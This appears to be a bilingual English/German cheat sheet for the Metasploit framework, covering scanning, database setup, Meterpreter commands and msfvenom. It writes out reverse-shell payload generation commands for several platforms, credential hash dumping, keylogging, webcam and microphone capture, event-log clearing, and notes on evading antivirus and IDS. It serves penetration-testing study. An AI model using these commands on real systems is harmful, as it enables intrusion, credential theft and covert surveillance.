---
description: exploitation framework with everything included
---

# metasploit — the swiss army knife of exploitation

penetration testing framework that combines scanning, exploitation, payload generation, and post-exploitation in one package.

## what it does

* scan target systems for vulnerabilities
* store data in database (postgresql backend)
* exploit vulnerabilities with ready-made modules  
* generate payloads with `msfvenom`
* interactive shells via `meterpreter`

## basic commands

| command | purpose |
|---------|---------|
| `msfconsole` | start metasploit console |
| `search <term>` | find modules by keyword |
| `use 1` | select module #1 from search results |
| `use auxiliary/scanner/smb/smb_version` | load module by path |
| `show options` | display module configuration |
| `set RHOSTS 10.0.0.1` | configure required options |
| `info <module>` | detailed module information |
| `show payloads` | list compatible payloads |
| `set payload windows/meterpreter/reverse_tcp` | choose payload |
| `sessions` | list active sessions |
| `sessions -i 1` | interact with session #1 |
| `CTRL + Z` | background current session |
| `run` or `exploit` | execute the module |

## scanning modules

```bash
# port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# UDP service discovery  
use auxiliary/scanner/discovery/udp_sweep

# SMB enumeration
use auxiliary/scanner/smb/smb_enumshares  # enumerate shares
use auxiliary/scanner/smb/smb_version     # grab SMB version
```

## database setup

metasploit uses postgresql to store scan results and track sessions.

```bash
systemctl start postgresql    # start database service
msfdb init                    # initialize metasploit database

db_status                     # Datenbank-Status prüfen
workspace                     # Aktuellen Workspace anzeigen
workspace -a (-d)             # Workspace hinzufügen ( add ), löschen ( delete )
workspace -h                  # Workspace alle Optionen anzeigen

help                          # Alle Datenbank-Befehle anzeigen

db_nmap                       # Nmap-Scan starten und Ergebnis in DB speichern

hosts                         # Relevante Informationen über "hosts"
services                      #                                 "services" anzeigen
hosts -h bzw. services -h     # alle optionen der Befehle

services -S <service_name>    # nach speziellem Service suchen
#bspw:
 HTTP ( Sqli, RCE )
  FTP ( anonymous login )
   SMB ( z.B. MS17-010 )
    SSH ( default/einfache login-daten )
     RDP ( Bluekeep/schwache login-daten )
```

## Meterpreter ( Exploit-Modul )

Meterpreter läuft auf dem Zielsystem, ist aber nicht darauf installiert. Er wird im Speicher ausgeführt und schreibt sich nicht auf die Festplatte des Zielsystems. Mit dieser Funktion soll vermieden werden, dass er bei Antiviren-Scans entdeckt wird. Standardmäßig scannen die meisten Antivirenprogramme neue Dateien auf der Festplatte (z. B. wenn Sie eine Datei aus dem Internet herunterladen).&#x20;

Meterpreter wird im Speicher (RAM - Random Access Memory) ausgeführt, um zu vermeiden, dass eine Datei auf die Festplatte des Zielsystems geschrieben werden muss (z. B. meterpreter.exe). Auf diese Weise wird Meterpreter als ein Prozess betrachtet und hat keine Datei auf dem Zielsystem.

Meterpreter zielt auch darauf ab, die Entdeckung durch netzwerkbasierte IPS- (Intrusion Prevention System) und IDS-Lösungen zu vermeiden, indem es eine verschlüsselte Kommunikation mit dem Server verwendet, auf dem Metasploit läuft. Wenn das Zielunternehmen den verschlüsselten Datenverkehr (z. B. HTTPS), der in das lokale Netzwerk eingeht und es verlässt, nicht entschlüsselt und überprüft, können IPS- und IDS-Lösungen die Aktivitäten nicht erkennen.

Obwohl Meterpreter von den gängigen Antivirenprogrammen erkannt wird, bietet diese Funktion ein gewisses Maß an Unauffälligkeit.

Es werden folgende Plattformen unterstützt:

* Android
* Apple iOS
* Java
* Linux
* OSX
* PHP
* Python
* Windows

Jeder unterstützte Befehl des jeweiligen Betriebssystems wird akzeptiert.

```
meterpreter > <befehl>
```

Zusätzliche Befehle sind:

### Core commands

* `background`: Backgrounds the current session
* `exit`: Terminate the Meterpreter session
* `guid`: Get the session GUID (Globally Unique Identifier)
* `help`: Displays the help menu
* `info`: Displays information about a Post module
* `irb`: Opens an interactive Ruby shell on the current session
* `load`: Loads one or more Meterpreter extensions
* `migrate`: Allows you to migrate Meterpreter to another process
* `run`: Executes a Meterpreter script or Post module
* `sessions`: Quickly switch to another session

### File system commands

* `cd`: Will change directory
* `ls`: Will list files in the current directory (dir will also work)
* `pwd`: Prints the current working directory
* `edit`: will allow you to edit a file
* `cat`: Will show the contents of a file to the screen
* `rm`: Will delete the specified file
* `search`: Will search for files
* `upload`: Will upload a file or directory
* `download`: Will download a file or directory

### Networking commands

* `arp`: Displays the host ARP (Address Resolution Protocol) cache
* `ifconfig`: Displays network interfaces available on the target system
* `netstat`: Displays the network connections
* `portfwd`: Forwards a local port to a remote service
* `route`: Allows you to view and modify the routing table

### System commands

* `clearev`: Clears the event logs
* `execute`: Executes a command
* `getpid`: Shows the current process identifier
* `getuid`: Shows the user that Meterpreter is running as
* `kill`: Terminates a process
* `pkill`: Terminates processes by name
* `ps`: Lists running processes
* `reboot`: Reboots the remote computer
* `shell`: Drops into a system command shell
* `shutdown`: Shuts down the remote computer
* `sysinfo`: Gets information about the remote system, such as OS

### Others Commands (these will be listed under different menu categories in the help menu)

* `idletime`: Returns the number of seconds the remote user has been idle
* `keyscan_dump`: Dumps the keystroke buffer
* `keyscan_start`: Starts capturing keystrokes
* `keyscan_stop`: Stops capturing keystrokes
* `screenshare`: Allows you to watch the remote user's desktop in real time
* `screenshot`: Grabs a screenshot of the interactive desktop
* `record_mic`: Records audio from the default microphone for X seconds
* `webcam_chat`: Starts a video chat
* `webcam_list`: Lists webcams
* `webcam_snap`: Takes a snapshot from the specified webcam
* `webcam_stream`: Plays a video stream from the specified webcam
* `getsystem`: Attempts to elevate your privilege to that of local system
* `hashdump`: Dumps the contents of the SAM database

Die Entscheidung, welche Version von Meterpreter verwendet werden soll, hängt hauptsächlich von drei Faktoren ab:

* Das Zielbetriebssystem (Ist das Zielbetriebssystem Linux oder Windows? Handelt es sich um ein Mac-Gerät? Ist es ein Android-Telefon? usw.)
* Auf dem Zielsystem verfügbare Komponenten (Ist Python installiert? Handelt es sich um eine PHP-Website? usw.)
* Arten von Netzwerkverbindungen, die mit dem Zielsystem hergestellt werden können (Sind raw TCP-Verbindungen zulässig? Kann nur eine HTTPS reverse connection hergestellt werden? Werden IPv6-Adressen nicht so streng überwacht wie IPv4-Adressen? usw.)

### Post-Exploitation

<table><thead><tr><th width="332">Befehl</th><th>Bedeutung</th></tr></thead><tbody><tr><td>getuid</td><td>Username anzeigen (Zielsystem) auf dem MP läuft</td></tr><tr><td>ps</td><td>alle laufenden Prozesse anzeigen</td></tr><tr><td></td><td></td></tr><tr><td>!Migrate kann zum Verlust von Privilegien führen!</td><td></td></tr><tr><td>migrate &#x3C;pid></td><td>MP-Prozess in anderen Prozess integrieren um:</td></tr><tr><td>keyscan_start</td><td>Tastatur-Eingaben aufzeichnen  ( Keylogger )</td></tr><tr><td>keyscan_stop</td><td>Aufzeichnung stoppen</td></tr><tr><td>keyscan_dump</td><td>Aufzeichnung ausgeben</td></tr><tr><td></td><td></td></tr><tr><td>hashdump</td><td>Einträge der SAM-DB (Security Account Manager) ausgeben (windows) -> NTLM-Format</td></tr><tr><td>Wenn hashdump "operation failed" liefert, könnte aktueller Prozess auf falscher Architektur laufen -> migrate</td><td></td></tr><tr><td></td><td></td></tr><tr><td>search -f &#x3C;filename></td><td>Datei suchen</td></tr><tr><td>shell</td><td>shell starten</td></tr><tr><td></td><td></td></tr><tr><td>load &#x3C;erweiterung></td><td>python, kiwi, etc.</td></tr><tr><td></td><td>Nach load ist "<code>help</code>" empfehlenswert</td></tr></tbody></table>

## Exploitation

Payloads werden in 2 Kategorien eingeteilt:

* Inline ( Single ) -> Kompletter Payload wird direkt installiert und ausgeführt.
* Staged -> Wird in 2 Schritte versendet. Der Stager wird initial auf dem Ziel installiert und lädt den restlichen Code des Payload nach. Dadurch kann die Größe des initialen Payloads minimiert werden.

```
show payloads    # verfügbare Payloads anzeigen
set payload 1    # Payload Nr. 1 auswählen

set payload /windows/../meterpreter/..  # meterpreter als payload setzen
run hashdump     # Hashes mit meterpreter dumpen
```

## msfvenom

Mit Msfvenom kann man auf alle im Metasploit-Framework verfügbaren Payloads zugreifen. Mit Msfvenom können Payloads in vielen verschiedenen Formaten (PHP, exe, dll, elf, etc.) und für viele verschiedene Zielsysteme (Apple, Windows, Android, Linux, etc.) erstellt werden.

```
# Payload generieren
msfvenom <parameter> LHOST=<ip>
```

| Parameter                        | Bedeutung                          |
| -------------------------------- | ---------------------------------- |
| `-l payloads`                    | Alle payloads auflisten            |
| `-p php/meterpreter/reverse_tcp` | payload festlegen                  |
| `--list formats`                 | Verfügbare Ausgabeformate anzeigen |
| `-f raw`                         | Ausgabe festlegen                  |
| `-e php/base64`                  | Encoding festlegen                 |
|                                  |                                    |
|                                  |                                    |

### Handler

Von msfvenom generierte "Reverse Shells und Meterpreter callbacks" können von einem Handler abgefangen werden. Der allgemeine Handler ist der Multi Handler ( Metasploit payloads, meterpreter, reguläre shells ) unter `exploit/multi/handler`.\
Der Ablauf kann dabei wie folgt sein:

* Generate the PHP shell using MSFvenom
* Start the Metasploit handler
* Execute the PHP shell

msfvenom benötigt eine Payload, die IP-Adresse des lokalen Rechners ( LHOST ) und den lokalen Port ( LPORT ), mit dem die Payload verbunden werden soll.q

```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```

### Weitere Payloads ( reverse shell )

#### Linux Executable and Linkable Format (elf)

{% code overflow="wrap" %}
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
{% endcode %}

Das .elf-Format ist vergleichbar mit dem .exe-Format in Windows. Dies sind ausführbare Dateien für Linux. Sie müssen jedoch sicherstellen, dass sie auf dem Zielcomputer ausführbare Rechte haben. Wenn Sie beispielsweise die Datei shell.elf auf Ihrem Zielcomputer haben, verwenden Sie den Befehl chmod +x shell.elf, um die Ausführbarkeit zu gewährleisten. Danach können Sie diese Datei ausführen, indem Sie ./shell.elf in die Befehlszeile des Zielcomputers eingeben.

#### Windows

{% code overflow="wrap" %}
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
{% endcode %}

#### PHP

{% code overflow="wrap" %}
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
{% endcode %}

#### ASP

{% code overflow="wrap" %}
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```
{% endcode %}

#### Python

{% code overflow="wrap" %}
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```
{% endcode %}

### Post Exploitation

```
##Dump Username und Passwort Hashes

# Windows
run hashdump

# Linux
run /post/linux/gather/hashdump
```
